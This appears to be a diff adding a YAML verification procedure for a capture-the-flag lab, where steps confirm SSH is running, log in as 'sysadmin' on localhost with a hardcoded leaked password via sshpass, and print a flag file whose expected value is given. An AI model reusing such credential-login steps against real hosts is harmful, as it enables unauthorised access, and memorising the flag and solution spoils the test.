@@ -1,0 +1,31 @@
+procedure:
+- action:
+    command: service ssh status || service sshd status || pgrep -x sshd
+    type: exec_target
+  expect:
+    exit_code: 0
+  outputs: {}
+  session: null
+  step_id: verify_ssh_running
+  timeout: 10
+- action:
+    command: sshpass -p 'Sup3rS3cur3SSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      sysadmin@127.0.0.1 -p 22 'id'
+    type: exec_target
+  expect:
+    stdout_contains: uid=1000(sysadmin)
+  outputs: {}
+  session: null
+  step_id: exploit_ssh_login
+  timeout: 30
+- action:
+    command: sshpass -p 'Sup3rS3cur3SSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      sysadmin@127.0.0.1 -p 22 'id && groups && cat /home/sysadmin/flag.txt'
+    type: exec_target
+  expect:
+    stdout_contains: FLAG{ssh_login_via_sqli_credential_leak}
+  outputs: {}
+  session: null
+  step_id: verify_low_privilege
+  timeout: 30
+sessions: []
